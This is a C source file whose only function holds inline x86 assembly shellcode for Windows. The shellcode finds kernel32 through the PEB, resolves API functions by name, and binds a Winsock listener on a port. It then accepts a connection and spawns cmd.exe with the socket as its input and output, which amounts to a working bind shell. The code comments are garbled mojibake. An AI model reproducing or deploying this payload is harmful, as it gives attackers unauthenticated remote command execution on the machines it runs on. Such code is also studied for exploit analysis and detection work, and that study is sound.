 #include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void shellcode()
{
    __asm
    {
            nop
            nop
            nop
            nop
            nop
            nop
            jmp start
find_function:
             //Ѱ��kernel32.dll�Ļ�ַ
             mov eax,fs:[30h]
            mov eax,[eax+0ch]
            mov eax,[eax+14h]
module_loop:
            mov eax,[eax]
            mov esi,[eax+28h]
            cmp byte ptr [esi+0ch],'3'   //����kernel32.dll
            jne module_loop

            mov ebp,[eax+010h]    //ebxΪkernel32.dll�Ļ�ַ

            mov eax,[ebp+03ch]
            mov ecx,[ebp+eax+78h]  //��ȡPE�ṹ�еĵ������ַ
            add ecx,ebp     //ecx��λ��������

            mov ebx,[ecx+20h]
            add ebx,ebp     //ebx��λ����������ָ���

            xor edi,edi
            pushad
name_loop:
            popad
            mov esi,[ebx+edi*4]   //��ȡһ��ָ��������ָ��
            add esi,ebp       //��λ���������ַ���
            inc edi
            mov edx,esp     //��ȡջ��Ҫ��ȡ�ĺ�������ʼ��ַ
            add edx,4
            pushad      //�Ĵ�����ջ
            mov eax,edx
            mov ebx,esi
name_cmp_loop:
             xor edx,edx
            mov cl,byte ptr [ebx]
            mov ch,byte ptr [eax]
            cmp cl,ch
            jne name_loop
            inc ebx
            inc eax
            cmp cl,dl
            jz break_name_loop
            jmp name_cmp_loop
break_name_loop:
             popad
            //�ҵ�������
            mov ebx,[ecx+24h]   //��λ������������RVA
            add ebx,ebp

            mov di,[ebx+2*edi]
            dec di
            mov ebx,[ecx+1ch]   //��λ��������ַ��RVA
            add ebx,ebp
            add ebp,[ebx+4*edi]    //��ȡ������ַ
            xchg eax,ebp

            ret
start:
            //LoadLibraryA
            push 0x00
            push 0x41797261
            push 0x7262694C
            push 0x64616F4C
            call find_function
            add esp,16
            push eax     //LoadLibraryA������ַ��ջ

            //GetProcAddress
            push 0x00007373
            push 0x65726464
            push 0x41636F72
            push 0x50746547
            call find_function
            add esp,16
            push eax         //GetProcAddress��ַ��ջ

            mov eax,dword ptr [esp+4]                //eax���LoadLibraryA�ĵ�ַ

            //����ws2_32
            push 0x3233
            push 0x5F327377
            push esp

            call eax        //eax=LoadLibraryA(esp);
            add esp,8
            push eax        //ws2_32.dll�����ջ


            //��ȡWSAStartup������ַ
            mov edx,dword ptr [esp]        //��ȡws2_32���
            mov ebx,dword ptr [esp+4]      //��ȡGetProcAddress��ַ
            push 0x7075
            push 0x74726174
            push 0x53415357
            push esp
            push edx
            call ebx    //eax�д��WSAStartup��ַ
            add esp,12

            //����WSAStartup
            xor esi,esi
            mov ecx,100
wsa_loop:
            push esi
            loop wsa_loop
            push esp
            push 0x02
            call eax
            //�жϺ����Ƿ���óɹ�
            cmp eax,esi
            jne exit_process

            //��ȡWSASocket������ַ
            mov edx,dword ptr [esp+400]    //��ȡws2_32.dll���
            mov ebx,dword ptr [esp+4+400]  //��ȡGetProcAddress��ַ
            push 0x4174
            push 0x656B636F
            push 0x53415357
            push esp
            push edx
            call ebx
            add esp,12

            //����WSASocket
            push 0x00
            push 0x00
            push 0x00
            push 0x00
            push 1
            push 2
            call eax
            push eax             //socket��ջ

            //����bind
            mov edx,dword ptr [esp+400+4]    //��ȡws2_32.dll���
            mov ebx,dword ptr [esp+4+400+4]  //��ȡGetProcAddress��ַ
            push 0x00
            push 0x646E6962
            push esp
            push edx
            call ebx
            add esp,8

            //����bind
            xor ebx,ebx
            mov ecx,4
addr_loop:                     //sockaddr�ṹ����ջ
            push ebx
            loop addr_loop

            mov byte ptr [esp],2h
            mov byte ptr [esp+2],1dh
            mov byte ptr [esp+3],0x0d
            mov edx,esp

            push 16
            push edx
            mov edx,dword ptr [esp+24]
            push edx
            call eax       //����bind()
            xor edx,edx
            cmp eax,edx
            jne exit_process
            push esp         //sockaddr��ַ��ջ

            //����listen
            mov edx,dword ptr [esp+400+4+20]    //��ȡws2_32.dll���
            mov ebx,dword ptr [esp+4+400+4+20]  //��ȡGetProcAddress��ַ
            push 0x6E65
            push 0x7473696C
            push esp
            push edx
            call ebx
            add esp,8

            //����listen
            mov edx,dword ptr [esp+4+16]   //��ȡsocket
            push 10
            push edx
            call eax
            xor edx,edx
            cmp edx,eax
            jne exit_process

            //����WSAAccept
            mov edx,dword ptr [esp+400+4+20]    //��ȡws2_32.dll���
            mov ebx,dword ptr [esp+4+400+4+20]  //��ȡGetProcAddress��ַ
            push 0x74
            push 0x70656363
            push 0x41415357
            push esp
            push edx
            call ebx
            add esp,12

            //����WSAAccept
            mov edx,dword ptr [esp+4+16]   //��ȡsocket
            mov esi,dword ptr [esp]        //��ȡsockaddr��ַ
            push 0x10
            mov ecx,esp
            push 0x00
            push 0x00
            push ecx
            push esi
            push edx
            call eax

            push eax      //���TCP���ӵ��׽�����ջ

            //����CreateProcess
            mov edx,dword ptr [esp+400+4+20+4+4]    //��ȡws2_32.dll���
            mov ebx,dword ptr [esp+4+400+4+20+4+4]  //��ȡGetProcAddress��ַ
            push 0x4173
            push 0x7365636F
            push 0x72506574
            push 0x61657243
            call find_function
            add esp,16

            //����CreateProcess
            xor edx,edx
            mov ecx,17
startupinfo_loop:         //68�ֽ�
            push edx
            loop startupinfo_loop

            mov byte ptr [esp],44h
            mov byte ptr [esp+44],1
            mov byte ptr [esp+45],1
            mov edx,dword ptr [esp+68]
            mov dword ptr [esp+56],edx
            mov dword ptr [esp+60],edx
            mov dword ptr [esp+64],edx

            mov esi,esp    //esi��ʱ���si�ĵ�ַ

            mov ecx,4
            xor edx,edx
PROCESS_INFORMATION_loop:       //16�ֽ�
            push edx
            loop PROCESS_INFORMATION_loop
            mov ecx,esp     //ecx��ʱ���pi�ṹ��ַ

            push 0x657865
            push 0x2E646D63

            mov edi,esp     //edi��ʱ���cmd��ַ

            push ecx
            push esi
            push edx
            push edx
            push edx
            push 1
            push edx
            push edx
            push edi
            push edx
            call eax

stop:
            inc ecx
            loop stop


            //ExitProcess
exit_process:
            push 0x00737365
            push 0x636F7250
            push 0x74697845
            call find_function

            push 0
            call eax
            nop
            nop
            nop
            nop
            nop
    }
}

int main()
{
    shellcode();
    return 0;
}
